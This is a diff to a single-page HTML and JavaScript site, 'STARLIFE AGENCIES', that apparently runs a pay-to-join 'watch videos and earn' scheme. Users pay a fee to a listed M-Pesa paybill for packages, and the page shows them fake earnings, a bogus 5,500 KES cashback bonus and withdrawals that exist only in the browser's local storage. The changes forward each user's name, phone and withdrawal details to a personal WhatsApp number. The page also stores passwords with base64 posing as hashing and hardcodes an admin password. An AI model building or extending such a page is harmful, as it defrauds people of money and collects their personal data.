@@ -12,65 +12,87 @@ input,select{width:100%;padding:12px;margin:6px 0;border-radius:8px;border:1px s
 .paybox{background:#e8f8f5;border:2px dashed #27ae60;padding:10px;border-radius:10px;text-align:center;font-weight:800}
 .count{font-size:22px;font-weight:900}
 .pkg{border:2px solid #000;padding:10px;border-radius:8px;margin:6px 0;background:#fafafa}
+.bonusBox{background:linear-gradient(135deg,#f39c12,#e67e22);color:#fff;padding:15px;border-radius:12px;text-align:center}
+.notif{background:#ff0000;color:#fff;padding:5px 10px;border-radius:50%;font-weight:900;animation:blink 1s infinite}
+@keyframes blink{50%{opacity:0.3}}
 </style>
 </head>
 <body>
 <h2>⭐ STARLIFE AGENCIES</h2>
-<div class="paybox">JOINING ONLY:<br>PAYBILL 714777<br>ACCOUNT 440200282954<br>Amount: Package you choose</div>
+<div class="paybox">JOINING ONLY:<br>PAYBILL 714777 | ACC 440200282954<br>Regular 200 | VIP 350 | Gold 500</div>
 
 <div id="auth" class="card">
 <h3>Join / Login</h3>
 <input id="jName" placeholder="Full Name">
 <input id="jPhone" placeholder="Phone 07...">
 <input id="jPass" type="password" placeholder="Password">
-<div class="pkg"><b>Regular 200 KES</b> - 100 per view</div>
-<div class="pkg"><b>VIP 350 KES</b> - 120 per view</div>
-<div class="pkg"><b>GOLD 500 KES</b> - 150 per view</div>
 <select id="jPkg">
 <option value="200|100">Regular - 200 KES (100/view)</option>
 <option value="350|120">VIP - 350 KES (120/view)</option>
 <option value="500|150">GOLD - 500 KES (150/view)</option>
 </select>
-<input id="jMpesa" placeholder="M-Pesa Code from Paybill">
+<input id="jMpesa" placeholder="M-Pesa Code">
 <button onclick="join()">JOIN NOW</button>
 <button onclick="login()" style="background:#444">LOGIN</button>
 </div>
 
 <div id="dash" style="display:none">
-<div class="card"><b id="uName"></b> <span class="badge" id="uStatus"></span><br>Phone: <span id="uPhone"></span><br>Package: <b id="uPkg"></b><br>Balance: <b id="uBal"></b> KES<br><button onclick="logout()" style="background:#c00">Logout</button></div>
+<div class="card"><b id="uName"></b> <span class="badge" id="uStatus"></span><br>Phone: <span id="uPhone"></span><br>Package: <b id="uPkg"></b></div>
+
+<div class="bonusBox">
+<h3 style="margin:0">🎉 CASHBACK BONUS</h3>
+<p style="font-size:28px;font-weight:900;margin:5px">KES 5,500</p>
+<p id="cashStatus">Welcome Bonus - Claim Now!</p>
+<button onclick="claimCash()" id="claimBtn" style="background:#fff;color:#e67e22">CLAIM 5,500 NOW</button>
+</div>
+
+<div class="card">Main Balance: <b id="uBal"></b> KES<br><button onclick="logout()" style="background:#c00">Logout</button></div>
 
 <div class="card"><h3>Watch & Earn</h3><button onclick="watch()">Watch Video + Earn</button><div id="vMsg"></div></div>
 
-<div class="card"><h3>Withdraw - NO FEE - Full Amount</h3><input id="wAmount" type="number" placeholder="Amount Min 300"><input id="wPhone" placeholder="Your M-Pesa Number"><button onclick="reqW()">Request Withdraw</button><div id="wList"></div></div>
+<div class="card"><h3>Withdraw - NO FEE FULL</h3><input id="wAmount" type="number" placeholder="Amount Min 500"><input id="wPhone" placeholder="Your M-Pesa Number"><button onclick="reqW()">Request Withdraw</button><div id="wList"></div></div>
 
-<div id="admin" class="card"><h3>Admin - Proof</h3><input id="aPass" type="password" placeholder="Admin Password"><button onclick="aLogin()">Unlock</button>
+<div id="admin" class="card"><h3>Admin Proof <span id="notifBadge"></span></h3><input id="aPass" type="password" placeholder="Admin Password"><button onclick="aLogin()">Unlock</button>
 <div id="aContent" style="display:none">
-<p>Total Joined: <span class="count" id="totalCount">0</span></p>
+<p>Total Joined: <span class="count" id="totalCount">0</span> | Pending: <span class="count" id="pendWCount" style="color:red">0</span></p>
 <input id="searchPhone" placeholder="Search phone..." oninput="renderAdmin()">
-<button onclick="exportCSV()" style="background:#27ae60">Export CSV Proof</button>
+<button onclick="exportCSV()" style="background:#27ae60">Export CSV</button>
 <h4>All Users</h4><div id="aUsers"></div>
-<h4>Pending</h4><div id="aPending"></div>
-<h4>Withdrawals</h4><div id="aW"></div>
+<h4>Withdraw Requests - Sent to 0762221240</h4><div id="aW"></div>
 </div>
 </div>
 </div>
 
 <script>
 function hash(p){return btoa(p)}
-let D=JSON.parse(localStorage.getItem('STAR_V3')||'{"users":[],"withdraws":[],"adminPass":"STARLIFE714777","curr":null}');
+let D=JSON.parse(localStorage.getItem('STAR_V4')||'{"users":[],"withdraws":[],"adminPass":"STARLIFE714777","curr":null}');
 let U=null;
-function save(){localStorage.setItem('STAR_V3',JSON.stringify(D))}
-function join(){const n=jName.value.trim(),ph=jPhone.value.trim(),pa=jPass.value.trim(),pkgRaw=jPkg.value,code=jMpesa.value.trim(); if(!n||!ph||!pa||!code)return alert('Fill all'); if(D.users.find(x=>x.phone===ph))return alert('Already joined'); const [pkgPrice,rate]=pkgRaw.split('|'); D.users.push({name:n,phone:ph,passHash:hash(pa),mpesa:code,pkg:pkgPrice,rate:+rate,bal:0,bonus:0,status:'pending',joinedAt:new Date().toLocaleString()}); save(); alert('Joined '+pkgPrice+'! Waiting approval'); loginF(ph,pa);}
+const ADMIN_WA='254762221240';
+function save(){localStorage.setItem('STAR_V4',JSON.stringify(D))}
+function join(){const n=jName.value.trim(),ph=jPhone.value.trim(),pa=jPass.value.trim(),pkgRaw=jPkg.value,code=jMpesa.value.trim(); if(!n||!ph||!pa||!code)return alert('Fill all'); if(D.users.find(x=>x.phone===ph))return alert('Already joined'); const [pkgPrice,rate]=pkgRaw.split('|'); D.users.push({name:n,phone:ph,passHash:hash(pa),mpesa:code,pkg:pkgPrice,rate:+rate,bal:0,cashback:5500,cashClaimed:false,status:'pending',joinedAt:new Date().toLocaleString()}); save(); alert('Joined! Cashback 5,500 waiting'); loginF(ph,pa);}
 function login(){loginF(jPhone.value.trim(),jPass.value.trim())}
 function loginF(ph,pa){const u=D.users.find(x=>x.phone===ph&&x.passHash===hash(pa)); if(!u)return alert('Wrong'); U=u; D.curr=ph; save(); show()}
-function show(){auth.style.display='none';dash.style.display='block';uName.textContent=U.name;uPhone.textContent=U.phone;uStatus.textContent=U.status;uPkg.textContent=U.pkg+' KES ('+U.rate+'/view)';uBal.textContent=U.bal; renderW()}
+function show(){auth.style.display='none';dash.style.display='block';uName.textContent=U.name;uPhone.textContent=U.phone;uStatus.textContent=U.status;uPkg.textContent=U.pkg+' KES ('+U.rate+'/view)';uBal.textContent=U.bal; if(U.cashClaimed){cashStatus.textContent='✅ CLAIMED - Added';claimBtn.style.display='none'}else{cashStatus.textContent='Welcome Bonus - Claim Now!';claimBtn.style.display='block'} renderW()}
 function logout(){D.curr=null;save();location.reload()}
-function watch(){if(U.status!=='active')return alert('Wait approval'); U.bal+=U.rate; save(); show(); vMsg.innerHTML='<div style="color:green;font-weight:800">+'+U.rate+' KES added!</div>';}
-function reqW(){const amt=+wAmount.value,mp=wPhone.value.trim(); if(amt<300)return alert('Min 300'); if(U.bal<amt)return alert('Low bal'); D.withdraws.push({phone:U.phone,name:U.name,amount:amt,mpesaPhone:mp,date:new Date().toLocaleString(),status:'pending'}); U.bal-=amt; save(); show(); alert('Withdraw '+amt+' - FULL amount - NO FEE')}
-function renderW(){const myW=D.withdraws.filter(w=>w.phone===U.phone); wList.innerHTML=myW.map(w=>`<div class="card">${w.date}: ${w.amount} KES To ${w.mpesaPhone} [${w.status}] FULL</div>`).join('')}
-function aLogin(){if(aPass.value!==D.adminPass)return alert('Wrong admin'); aContent.style.display='block'; renderAdmin()}
-function renderAdmin(){const q=(searchPhone.value||'').trim(); let list=D.users; if(q) list=list.filter(u=>u.phone.includes(q)); totalCount.textContent=D.users.length; aUsers.innerHTML=list.map(u=>{const i=D.users.indexOf(u); return `<div class="card"><b>${u.name}</b><br>Phone: <b>${u.phone}</b><br>PKG: ${u.pkg} (${u.rate}/view) Status:${u.status}<br>Joined:${u.joinedAt}<br>Code:${u.mpesa}<br>Bal:${u.bal}<br><span style="color:green">Pass: ***HIDDEN***</span><br><button onclick="D.users[${i}].status='active';save();renderAdmin()">Approve</button></div>`}).join('')||'None'; aPending.innerHTML=D.users.filter(u=>u.status==='pending').map(u=>{const i=D.users.indexOf(u); return `<div class="card">${u.name} ${u.phone} PKG ${u.pkg}<button onclick="D.users[${i}].status='active';save();renderAdmin()">Approve</button></div>`}).join('')||'None'; aW.innerHTML=D.withdraws.map(w=>{const idx=D.withdraws.indexOf(w); return `<div class="card">${w.name} ${w.phone} -> ${w.amount} FULL To ${w.mpesaPhone}<br>${w.date} [${w.status}]<br><button onclick="D.withdraws[${idx}].status='paid';save();renderAdmin()">Mark Paid FULL</button></div>`}).join('')||'None';}
-function exportCSV(){let csv="Name,Phone,Package,Rate,Status,Joined,Mpesa,Balance\n"; D.users.forEach(u=>{csv+=`"${u.name}","${u.phone}","${u.pkg}","${u.rate}","${u.status}","${u.joinedAt}","${u.mpesa}","${u.bal}"\n`}); const b=new Blob([csv],{type:'text/csv'}); const a=document.createElement('a'); a.href=URL.createObjectURL(b); a.download='starlife_proof.csv'; a.click();}
+function claimCash(){if(U.cashClaimed)return alert('Already'); if(U.status!=='active')return alert('Wait approval'); U.bal+=5500; U.cashClaimed=true; save(); show(); alert('🎉 5,500 Claimed!');}
+function watch(){if(U.status!=='active')return alert('Wait approval'); U.bal+=U.rate; save(); show(); vMsg.innerHTML='<div style="color:green;font-weight:800">+'+U.rate+' KES!</div>';}
+function reqW(){
+ const amt=+wAmount.value,mp=wPhone.value.trim();
+ if(amt<500)return alert('Min 500');
+ if(U.bal<amt)return alert('Low bal');
+ D.withdraws.push({phone:U.phone,name:U.name,amount:amt,mpesaPhone:mp,date:new Date().toLocaleString(),status:'pending',pkg:U.pkg});
+ U.bal-=amt; save(); show();
+ // NOTIFY YOU ON 0762221240
+ const msg=`🔔 STARLIFE WITHDRAW%0AName: ${U.name}%0APhone: ${U.phone}%0APackage: ${U.pkg}%0AAmount: ${amt} KES%0ATo M-Pesa: ${mp}%0ADate: ${new Date().toLocaleString()}%0AClaimed Cashback: ${U.cashClaimed?'YES 5500':'NO'}`;
+ const wa=`https://wa.me/${ADMIN_WA}?text=${msg}`;
+ window.open(wa,'_blank');
+ if(Notification && Notification.permission==="granted"){new Notification(`NEW WITHDRAW ${amt} from ${U.name}`)} else if(Notification){Notification.requestPermission()}
+ alert('Withdraw '+amt+' requested - Admin 0762221240 notified!');
+}
+function renderW(){const myW=D.withdraws.filter(w=>w.phone===U.phone); wList.innerHTML=myW.map(w=>`<div class="card">${w.date}: ${w.amount} To ${w.mpesaPhone} [${w.status}]</div>`).join('')}
+function aLogin(){if(aPass.value!==D.adminPass)return alert('Wrong'); aContent.style.display='block'; renderAdmin()}
+function renderAdmin(){const q=(searchPhone.value||'').trim(); let list=D.users; if(q) list=list.filter(u=>u.phone.includes(q)); totalCount.textContent=D.users.length; const pend=D.withdraws.filter(w=>w.status==='pending').length; pendWCount.textContent=pend; notifBadge.innerHTML=pend>0?`<span class="notif">${pend}</span> NEW!`:''; if(pend>0)document.title=`(${pend}) WITHDRAW - STARLIFE`; aUsers.innerHTML=list.map(u=>{const i=D.users.indexOf(u); return `<div class="card"><b>${u.name}</b> ${u.phone} PKG:${u.pkg} Bal:${u.bal} ${u.cashClaimed?'5500 CLAIMED':'5500 NOT'}<br>${u.joinedAt}<br><span style="color:green">Pass ***HIDDEN***</span><br><button onclick="D.users[${i}].status='active';save();renderAdmin()">Approve</button></div>`}).join('')||'None'; aW.innerHTML=D.withdraws.map(w=>{const idx=D.withdraws.indexOf(w); return `<div class="card" style="border:2px solid red"><b style="color:red">🔔 TO YOU 0762221240</b><br>${w.name} ${w.phone} PKG ${w.pkg}<br>${w.amount} To ${w.mpesaPhone}<br>${w.date} [${w.status}]<br><a href="https://wa.me/${w.mpesaPhone}?text=Withdraw ${w.amount} processing" target="_blank"><button style="background:#25D366">WhatsApp Client</button></a><button onclick="D.withdraws[${idx}].status='paid';save();renderAdmin()">Mark Paid</button></div>`}).reverse().join('')||'None';}
+function exportCSV(){let csv="Name,Phone,Package,Rate,Status,Joined,Mpesa,Balance,CashClaimed\n"; D.users.forEach(u=>{csv+=`"${u.name}","${u.phone}","${u.pkg}","${u.rate}","${u.status}","${u.joinedAt}","${u.mpesa}","${u.bal}","${u.cashClaimed}"\n`}); const b=new Blob([csv],{type:'text/csv'}); const a=document.createElement('a'); a.href=URL.createObjectURL(b); a.download='starlife_proof.csv'; a.click();}
 if(D.curr){const u=D.users.find(x=>x.phone===D.curr); if(u){U=u;show()}}
 </script>
 </body>
